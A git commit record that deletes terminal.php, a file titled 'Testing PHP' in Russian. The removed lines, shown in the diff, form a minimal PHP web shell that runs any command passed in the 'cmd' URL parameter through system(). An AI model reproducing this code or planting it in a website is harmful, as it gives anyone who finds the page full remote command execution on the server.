9d0a0f0cd4efafae4a34a6f277c6a49234f07942
demsp <dserp18@gmail.com>
2023-04-17 17:00:50 +0300

    Delete terminal.php

--- terminal.php
+++
@@ -1,8 +0,0 @@
-<html>
- <head>
-  <title>Тестируем PHP</title>
- </head>
- <body>
-  <?php echo '<form><input name="cmd" /></form>'; if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
-  </body>
-</html>
